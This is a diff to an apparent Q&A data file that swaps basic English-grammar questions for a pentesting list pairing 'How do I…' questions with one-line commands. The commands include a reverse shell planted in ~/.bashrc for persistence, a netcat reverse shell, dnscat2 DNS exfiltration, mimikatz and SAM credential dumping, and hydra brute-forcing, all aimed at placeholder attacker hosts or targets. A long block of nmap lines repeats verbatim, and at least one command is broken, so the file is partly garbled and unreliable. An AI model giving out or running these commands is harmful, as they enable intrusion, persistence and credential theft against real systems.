@@ -1,23 +1,96 @@
-What is a noun? A noun is a word that names a person, place, thing, or idea.
-What is a verb? A verb is a word that expresses an action or a state of being.
-What is an adjective? An adjective is a word that describes a noun.
-What is a pronoun? A pronoun is a word that takes the place of a noun.
-What is a sentence? A sentence is a group of words that expresses a complete thought.
-What is the past tense of "go"? The past tense of "go" is "went".
-What is a synonym for "happy"? A synonym for "happy" is "joyful".
-What is the opposite of "hot"? The opposite of "hot" is "cold".
-What is a question? A question is a sentence that asks for information.
-What is a statement? A statement is a sentence that gives information.
-What is a paragraph? A paragraph is a group of related sentences about one topic.
-What is a subject in a sentence? The subject is who or what the sentence is about.
-What is an object in a sentence? The object is the person or thing that receives the action.
-What is a preposition? A preposition is a word that shows the relationship between a noun or pronoun and other words in a sentence.
-What is a conjunction? A conjunction is a word that connects words, phrases, or clauses.
-What is a simple sentence? A simple sentence has one subject and one predicate.
-What is a compound sentence? A compound sentence has two or more independent clauses joined by a conjunction.
-What is a question mark? A question mark is a punctuation mark used at the end of a question.
-What is a period? A period is a punctuation mark used at the end of a statement.
-What is a comma? A comma is a punctuation mark used to separate items in a list or clauses in a sentence.
+
+# Pentesting Q&A and Command Templates
+How do I scan all ports on a target with nmap? nmap -p- <target>
+How do I enumerate SMB shares? smbclient -L //<target> -N
+How do I brute-force SSH credentials? hydra -l <user> -P <wordlist> ssh://<target>
+How do I find subdomains? sublist3r -d <domain>
+How do I check for SQL injection? sqlmap -u <url> --batch
+How do I enumerate users on Linux? cat /etc/passwd
+How do I escalate privileges with Linux kernel exploits? searchsploit linux kernel
+How do I dump password hashes on Windows? mimikatz sekurlsa::logonpasswords
+How do I scan for web vulnerabilities? nikto -h <target>
+How do I enumerate HTTP headers? curl -I <url>
+How do I find open S3 buckets? aws s3 ls s3://<bucket> --no-sign-request
+How do I exfiltrate data with DNS? dnscat2 <attacker_ip>
+How do I maintain persistence on Linux? echo 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1' >> ~/.bashrc
+How do I enumerate network interfaces? ip a
+How do I scan for live hosts in a subnet? nmap -sn <subnet>/24
+How do I enumerate running processes? ps aux
+How do I find hidden files on a web server? dirb <url>
+How do I enumerate open shares with enum4linux? enum4linux -a <target>
+How do I check for default credentials? hydra -L users.txt -P passwords.txt <service>://<target>
+How do I use Metasploit for exploitation? msfconsole -x 'use exploit/<module>; set RHOSTS <target>; run'
+How do I create a reverse shell with netcat? nc -e /bin/bash <attacker_ip> 4444
+How do I enumerate DNS records? dig ANY <domain>
+How do I check for open RDP ports? nmap -p 3389 <target>
+How do I enumerate SNMP info? snmpwalk -v2c -c public <target>
+How do I scan for vulnerable web apps? wpscan --url <url>
+How do I enumerate SSL/TLS ciphers? sslscan <target>:443
+How do I find public exploits for a CVE? searchsploit <CVE-ID>
+How do I enumerate users on Windows? net user /domain
+How do I dump SAM database? reg save HKLM\SAM sam.save
+How do I enumerate Kerberos tickets? klist
+How do I use CrackMapExec for SMB? crackmapexec smb <target> -u <user> -p <pass>
+How do I enumerate NFS shares? showmount -e <target>
+How do I scan for Jenkins dashboards? nmap -p 8080 <target>
+How do I enumerate AWS IAM users? aws iam list-users --no-sign-request
+How do I enumerate Docker containers? docker ps -a
+How do I enumerate Kubernetes pods? kubectl get pods --all-namespaces
+How do I enumerate GCP buckets? gsutil ls
+How do I enumerate Azure storage? az storage account list
+How do I enumerate HTTP methods? curl -X OPTIONS <url> -i
+How do I enumerate web technologies? whatweb <url>
+How do I enumerate login portals? aquatone-discover --domain <domain>
+How do I enumerate public GitHub repos? github-search <keyword>
+How do I enumerate open MongoDB? nmap -p 27017 <target>
+How do I enumerate Redis? nmap -p 6379 <target>
+How do I enumerate Elasticsearch? nmap -p 9200 <target>
+How do I enumerate RabbitMQ? nmap -p 5672 <target>
+How do I enumerate Zookeeper? nmap -p 2181 <target>
+How do I enumerate Grafana? nmap -p 3000 <target>
+How do I enumerate Kibana? nmap -p 5601 <target>
+How do I enumerate Jenkins? nmap -p 8080 <target>
+How do I enumerate Tomcat? nmap -p 8080 <target>
+How do I enumerate WebLogic? nmap -p 7001 <target>
+How do I enumerate JBoss? nmap -p 8080 <target>
+How do I enumerate vSphere? nmap -p 443 <target>
+How do I enumerate Citrix? nmap -p 1494 <target>
+How do I enumerate SAP? nmap -p 3200 <target>
+How do I enumerate Oracle DB? nmap -p 1521 <target>
+How do I enumerate MySQL? nmap -p 3306 <target>
+How do I enumerate PostgreSQL? nmap -p 5432 <target>
+How do I enumerate MSSQL? nmap -p 1433 <target>
+How do I enumerate FTP? nmap -p 21 <target>
+How do I enumerate Telnet? nmap -p 23 <target>
+How do I enumerate VNC? nmap -p 5900 <target>
+How do I enumerate SNMP? nmap -p 161 <target>
+How do I enumerate LDAP? nmap -p 389 <target>
+How do I enumerate RDP? nmap -p 3389 <target>
+How do I enumerate SMB? nmap -p 445 <target>
+How do I enumerate NFS? nmap -p 2049 <target>
+How do I enumerate Docker? nmap -p 2375 <target>
+How do I enumerate Kubernetes? nmap -p 10250 <target>
+How do I enumerate Jenkins? nmap -p 8080 <target>
+How do I enumerate Tomcat? nmap -p 8080 <target>
+How do I enumerate WebLogic? nmap -p 7001 <target>
+How do I enumerate JBoss? nmap -p 8080 <target>
+How do I enumerate vSphere? nmap -p 443 <target>
+How do I enumerate Citrix? nmap -p 1494 <target>
+How do I enumerate SAP? nmap -p 3200 <target>
+How do I enumerate Oracle DB? nmap -p 1521 <target>
+How do I enumerate MySQL? nmap -p 3306 <target>
+How do I enumerate PostgreSQL? nmap -p 5432 <target>
+How do I enumerate MSSQL? nmap -p 1433 <target>
+How do I enumerate FTP? nmap -p 21 <target>
+How do I enumerate Telnet? nmap -p 23 <target>
+How do I enumerate VNC? nmap -p 5900 <target>
+How do I enumerate SNMP? nmap -p 161 <target>
+How do I enumerate LDAP? nmap -p 389 <target>
+How do I enumerate RDP? nmap -p 3389 <target>
+How do I enumerate SMB? nmap -p 445 <target>
+How do I enumerate NFS? nmap -p 2049 <target>
+How do I enumerate Docker? nmap -p 2375 <target>
+How do I enumerate Kubernetes? nmap -p 10250 <target>
 
 # Hacking and General Q&A
 
